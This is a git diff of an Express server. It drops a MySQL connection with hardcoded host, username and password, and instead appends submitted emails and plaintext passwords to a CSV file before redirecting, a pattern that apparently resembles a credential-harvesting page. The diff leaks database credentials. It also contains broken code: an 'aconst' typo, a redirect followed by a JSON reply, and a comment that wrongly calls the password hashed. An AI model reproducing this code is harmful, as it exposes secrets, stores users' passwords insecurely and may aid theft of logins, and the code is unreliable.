@@ -19,37 +19,26 @@ app.use(express.static(__dirname + '/app/public'));
 app.use(bodyParser.urlencoded({ extended: true }));
 require('./app/routes')(app); 
 
-app.use(bodyParser.urlencoded({ extended: false }));
+aconst fs = require('fs');
+const path = require('path');
+const csvWriter = require('csv-write-stream');
 
-// parse application/json
- // Add this line to use JSON middleware
-
-
-const mysql = require('mysql2/promise');
-
-// Configure the database connection details
-const dbConfig = {
-  host: '162.215.230.15',
-  user: 'superprof',
-  password: '5moc4S$42',
-  database: 'DATA',
-};
-
+const csvFilePath = path.join(__dirname, 'data.csv');
 
 app.post('/Connect', async (req, res) => {
   try {
     const { email, password } = req.body;
-    // Connect to the database
-    const connection = await mysql.createConnection(dbConfig);
 
-    // Insert the email and hashed password into the users table
-    const [result] = await connection.execute(
-      'INSERT INTO users (email, password) VALUES (?, ?)',
-      [email, password]
-    );
+    // Create a CSV writer if the file does not exist or append to the existing file
+    const writer = csvWriter({ headers: ['email', 'password'], sendHeaders: !fs.existsSync(csvFilePath) });
+    writer.pipe(fs.createWriteStream(csvFilePath, { flags: 'a' }));
 
-    // Close the database connection
-    await connection.end();
+    // Write the email and password to the CSV file
+    writer.write({ email, password });
+
+    // Close the CSV writer
+    writer.end();
+
     res.redirect('/');
     res.status(200).json({ message: 'Data saved successfully' });
   } catch (error) {
@@ -57,6 +46,7 @@ app.post('/Connect', async (req, res) => {
     res.status(500).json({ message: 'An error occurred while saving data' });
   }
 });
+
 
 http.createServer(app).listen(app.get('port'), function(){
 	console.log('PORT: ' + app.get('port'));
